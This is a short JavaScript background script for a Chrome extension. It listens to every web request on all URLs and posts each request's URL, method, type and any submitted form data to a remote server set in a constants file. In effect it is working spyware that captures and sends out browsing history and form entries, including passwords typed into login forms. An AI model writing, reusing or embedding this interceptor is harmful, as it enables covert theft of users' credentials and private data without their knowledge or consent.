const axios     = require('axios');
const constants = require("../utils/constants");

chrome.webRequest.onBeforeRequest.addListener(
  function (details) {
    if (constants.apiURL === details.url) return;

    let content;

    if (details.hasOwnProperty("requestBody")) {
      if ((details.requestBody.hasOwnProperty("formData"))) {
        content = details.requestBody.formData
      }
    }

    let payload = {
      "date"    : new Date().toLocaleString(),
      "type"    : details.type,
      "method"  : details.method,
      "url"     : details.url,
      "content" : content
    };

    let config = {
      headers: {
        "Content-Type": "application/json",
        "Access-Control-Allow-Origin": "*"
      }
    };

    axios.post(constants.apiURL, payload, config)
      .then((response) => {
        alert(response)
      })
      .catch((error) => {
        alert(error)
      })
  },
  {
    urls: [
      "<all_urls>"
    ]
  },
  []
);